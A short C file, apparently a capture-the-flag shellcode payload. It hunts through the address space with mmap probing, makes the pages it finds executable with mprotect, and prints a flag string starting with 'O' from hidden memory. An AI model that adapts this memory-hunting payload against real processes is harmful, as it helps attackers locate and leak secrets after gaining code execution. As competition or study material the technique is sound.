#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL

void *shellcode()
{
    int alloc_multiple = 1 << 14;

    int size = 4096;
    void * start = ADDR_MIN;
    void * res;

    while(1){
      int alloc_len = alloc_multiple * size;
      res = mmap(start, alloc_len, PROT_READ, 0x22  , -1, 0);
      if(res == start || res != (void *)-1 ){
        munmap(res, alloc_len);
      }
      //Handle cases with actual allocations
      if(res != start){
        //printf("trying to alloc %p %p\n", start, start + alloc_multiple * size);
        if(res == (void*)-1){
          //perror("");
        }
        if(alloc_multiple != 1){
          //printf("Gotem %d\n", alloc_multiple);
          //printf("count %d res %p start %p\n", count, res, start);
          alloc_multiple >>=1;
        }else if(alloc_multiple == 1){
          void * found = start;
          //printf("trying addr %p\n", found);
          //printf("try %s\n", found + (size * 4));
          int i;
          for(i = -4; i < 8; i++){
            void * this_guy = (void *)mprotect((void *)found + (size * i), size, 7);
            //printf("this guy %d %p\n", i, this_guy);
            if(this_guy == NULL){
              char * found_string = (char *)(found + (size * i));
              if(found_string[0] == 'O'){
                write(1, found_string, 40);
                return (void *)found_string;
              }else{
                //printf("Bad flag %p %s\n", found_string, found_string);
                start = found_string + (size * 500);
                alloc_multiple = (1 << 14);
              }
            }
          }
        }
      }
      else if(res == start){
        start += alloc_multiple * size;
      }
    }
}
